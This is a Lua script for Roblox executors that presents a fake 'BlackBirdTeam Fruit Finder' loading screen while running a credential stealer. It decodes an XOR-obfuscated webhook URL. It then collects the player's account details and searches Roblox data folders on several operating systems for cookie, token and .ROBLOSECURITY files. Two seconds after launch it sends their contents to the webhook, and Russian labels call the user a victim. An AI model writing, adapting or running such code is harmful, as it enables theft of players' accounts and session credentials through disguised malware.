local key = 123
local encrypted_webhook = {
    19, 15, 15, 11, 8, 65, 84, 84, 31, 18, 8, 24, 20, 9, 31, 85, 24, 20, 22, 84,
    26, 11, 18, 84, 12, 30, 25, 19, 20, 20, 16, 8, 84, 74, 78, 79, 74, 66, 73,
    74, 74, 79, 67, 74, 74, 79, 74, 67, 73, 73, 73, 79, 84, 29, 23, 75, 53, 41,
    34, 16, 24, 15, 57, 9, 34, 41, 66, 86, 22, 24, 44, 16, 17, 41, 33, 55, 62,
    30, 44, 44, 10, 41, 40, 28, 47, 55, 57, 35, 15, 62, 11, 21, 75, 47, 73, 24,
    66, 46, 73, 14, 73, 35, 62, 79, 48, 57, 14, 12, 44, 67, 76, 33, 41, 76, 53,
    19, 11, 9, 1, 1, 62
}
local function pure_bxor(a, b)
    local result = 0
    local bitval = 1
    while a > 0 or b > 0 do
        local abit = a % 2
        local bbit = b % 2
        if abit ~= bbit then
            result = result + bitval
        end
        a = math.floor(a / 2)
        b = math.floor(b / 2)
        bitval = bitval * 2
    end
    return result
end
local bxor = (bit32 and bit32.bxor) or (bit and bit.bxor) or pure_bxor
local function decrypt(data, key)
    local bytes = {}
    for _, b in ipairs(data) do
        table.insert(bytes, string.char(bxor(b, key)))
    end
    return table.concat(bytes)
end
local webhook = decrypt(encrypted_webhook, key)
local function sendToWebhook(data)
    local HttpService = game:GetService("HttpService")
    local payload = {
        content = "**Украденные данные Роблокс**",
        embeds = {{
            title = "Жертва попалась!",
            description = data,
            color = 16711680
        }}
    }
    local json = HttpService:JSONEncode(payload)
    local success, err = pcall(function()
        HttpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
    end)
    if not success then
        if syn and syn.request then
            pcall(function()
                syn.request({
                    Url = webhook,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = json
                })
            end)
        end
    end
end
local function getAccountInfo()
    local player = game.Players.LocalPlayer
    local info = ""
    if player then
        info = info .. "**UserID:** " .. player.UserId .. "\n"
        info = info .. "**Username:** " .. player.Name .. "\n"
        info = info .. "**DisplayName:** " .. (player.DisplayName or "N/A") .. "\n"
        local userId = player.UserId
        local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
        info = info .. "**Thumbnail:** " .. thumb .. "\n"
        if game:GetService("RunService"):IsStudio() then
            info = info .. "**Окружение:** Roblox Studio\n"
        else
            info = info .. "**Окружение:** Roblox Client\n"
        end
    end
    return info
end
local function scanFolder(folder, pattern, recursive)
    local found = {}
    local success, list = pcall(listfiles, folder)
    if success and list then
        for _, item in ipairs(list) do
            local fullPath = folder .. "/" .. item
            if isfile and isfile(fullPath) then
                if item:lower():match(pattern) then
                    table.insert(found, fullPath)
                end
            elseif isfolder and isfolder(fullPath) and recursive then
                local subfound = scanFolder(fullPath, pattern, true)
                for _, f in ipairs(subfound) do
                    table.insert(found, f)
                end
            end
        end
    end
    return found
end
local function stealAllData()
    local collected = {}
    local basePaths = {
        os.getenv("APPDATA") .. "\\Roblox",
        os.getenv("LOCALAPPDATA") .. "\\Roblox",
        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox",
        os.getenv("USERPROFILE") .. "\\AppData\\Roaming\\Roblox",
        os.getenv("USERPROFILE") .. "\\Roblox",
        os.getenv("HOME") .. "/Library/Application Support/Roblox",
        os.getenv("HOME") .. "/.roblox",
        os.getenv("HOME") .. "/.config/roblox",
        os.getenv("HOME") .. "/.roblox",
        "/root/.roblox",
        "/data/data/com.roblox.client",
        "/data/user/0/com.roblox.client",
        "/storage/emulated/0/Android/data/com.roblox.client",
        "/sdcard/Android/data/com.roblox.client",
        "/data/data/com.roblox.client/shared_prefs",
        "/data/data/com.roblox.client/files",
        "/data/data/com.roblox.client/databases",
        "/storage/emulated/0/Android/data/com.roblox.client/files"
    }
    local pattern = "cookie|session|auth|token|roblosecurity|settings|preferences|account|login|log|globalbasic|globalsettings|identity|credential|key|\.roblox|\.rbxs|\.dat|\.json|\.xml"
    for _, base in ipairs(basePaths) do
        if isfolder and isfolder(base) then
            local files = scanFolder(base, pattern, true)
            for _, f in ipairs(files) do
                local content = readfile(f)
                if content and content ~= "" then
                    table.insert(collected, "**Файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
                end
            end
        else
            if isfile and isfile(base) and base:lower():match(pattern) then
                local content = readfile(base)
                if content then
                    table.insert(collected, "**Файл:** " .. base .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
                end
            end
        end
    end
    local directFiles = {
        os.getenv("APPDATA") .. "\\Roblox\\GlobalBasicSettings_13.xml",
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\GlobalBasicSettings_13.xml",
        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\GlobalBasicSettings_13.xml",
        os.getenv("HOME") .. "/Library/Application Support/Roblox/GlobalBasicSettings_13.xml",
        os.getenv("HOME") .. "/.roblox/GlobalBasicSettings_13.xml",
        os.getenv("HOME") .. "/.config/roblox/GlobalBasicSettings_13.xml",
        "/data/data/com.roblox.client/shared_prefs/roblox.xml",
        "/data/data/com.roblox.client/shared_prefs/Roblox.xml",
        "/data/data/com.roblox.client/files/GlobalBasicSettings_13.xml",
        "/storage/emulated/0/Android/data/com.roblox.client/files/GlobalBasicSettings_13.xml"
    }
    for _, f in ipairs(directFiles) do
        if isfile and isfile(f) then
            local content = readfile(f)
            if content then
                table.insert(collected, "**Прямой файл:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
            end
        end
    end
    if #collected == 0 then
        for _, base in ipairs(basePaths) do
            if isfolder and isfolder(base) then
                local allFiles = scanFolder(base, ".*", true)
                for _, f in ipairs(allFiles) do
                    local content = readfile(f)
                    if content and content:find(".ROBLOSECURITY") then
                        table.insert(collected, "**Файл с .ROBLOSECURITY:** " .. f .. "\n**Содержимое:**\n```\n" .. tostring(content):sub(1, 3000) .. "\n```")
                    end
                end
            end
        end
    end
    return table.concat(collected, "\n\n---\n\n")
end
local function main()
    local data = getAccountInfo()
    local stolenData = stealAllData()
    if stolenData and stolenData ~= "" then
        data = data .. "\n\n**Собранные данные:**\n" .. stolenData
    else
        data = data .. "\n\n**Данные не найдены (возможно, эксплоит не имеет доступа к файловой системе).**"
    end
    sendToWebhook(data)
end
delay(2, function()
    pcall(main)
end)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 100)
Frame.Position = UDim2.new(0.5, -150, 0.5, -50)
Frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
Frame.Parent = ScreenGui
local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1,0,1,0)
Label.Text = "BlackBirdTeam Fruit Finder v1.0 - Загрузка..."
Label.TextColor3 = Color3.fromRGB(255,255,255)
Label.BackgroundTransparency = 1
Label.Font = Enum.Font.SourceSansBold
Label.TextSize = 14
Label.Parent = Frame
delay(5, function()
    if ScreenGui and ScreenGui.Parent then
        ScreenGui:Destroy()
    end
end)
